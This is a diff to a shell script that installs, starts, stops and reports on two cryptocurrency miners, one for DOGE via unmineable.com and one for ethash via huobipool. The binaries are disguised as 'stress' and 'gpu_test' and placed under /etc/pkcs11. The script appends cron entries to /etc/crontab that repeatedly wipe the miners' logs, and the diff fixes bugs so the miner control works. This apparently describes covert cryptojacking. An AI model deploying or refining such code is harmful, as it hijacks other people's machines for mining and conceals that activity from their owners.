@@ -15,6 +15,7 @@ function DogeStatus(){
         echo "Active: Doge is active (running)"
     else
         echo "Active: Doge is inactive (dead)"
+    fi
 }
 
 function DogeStart(){
@@ -22,12 +23,12 @@ function DogeStart(){
     ./stress -a rx -k -o rx.unmineable.com:13333 -u DOGE:DN8ejjCTkpkP6ZV8vfW5chHoMow4DTHtC8.doge -B -l /opt/src/stress/stress.log
     echo "00 */3 * * * root echo '' >/opt/src/stress/stress.log" >> /etc/crontab
     # echo $dogepid
-    Dogestatus
+    DogeStatus
 }
 
 function DogeStop(){
     if [ -n "$dogepid" ]; then
-        kill -9 "$dogepid"
+        kill -9 $dogepid
     else
         echo "Active: Not active"
     fi
@@ -41,7 +42,6 @@ function EthInstall(){
 }
 
 function EthStatus(){
-    pid=`ps -ef | grep -v grep | grep gpu_test | awk '{print $2}'`
     if [ -n "$ethpid" ]; then
         echo "Active: active (running)"
     else
@@ -51,17 +51,14 @@ function EthStatus(){
 
 function EthStart(){
     cd /etc/pkcs11/gpu_stress && nohup ./gpu_test -a ethash -o stratum+tcp://en.huobipool.com:1800 -u dotpodminer.001 &
-    sleep 1
     echo "00 */1 * * * root echo '' > /etc/pkcs11/gpu_stress/nohup.out" >> /etc/crontab
     #sed -i '$a 00 \*\/1 \* \* \* echo \"\" \> \/etc\/pkcs11\/gpu_stress\/nohup.out' /etc/crontab
-    EthStatus
 }
 
 function EthStop(){
-    pid=`ps -ef | grep -v grep | grep gpu | awk '{print $2}'`
     if [ -n "$ethpid" ]; then
-        sed -i '$d' /etc/crontab
-        kill -9 "$ethpid"
+        # sed -i '$d' /etc/crontab
+        kill -9 $ethpid
     else
         echo "Active: Not active"
     fi
@@ -76,7 +73,7 @@ if [[ -n "$1" && -n "$2" ]]; then
         elif [ "$2" == "stop" ]; then
             DogeStop
         elif [ "$2" == "status" ]; then
-            Dogestatus
+            DogeStatus
         else
             echo "Error: The second parameter must be install/start/status/status"
         fi
@@ -85,9 +82,9 @@ if [[ -n "$1" && -n "$2" ]]; then
             EthInstall
         elif [ "$2" == "start" ]; then
             EthStart
-        elif [ "$1" == "stop" ]; then
+        elif [ "$2" == "stop" ]; then
             EthStop
-        elif [ "$1" == "status" ]; then
+        elif [ "$2" == "status" ]; then
             EthStatus
         else
             echo "Error: The second parameter must be install/start/status/status"
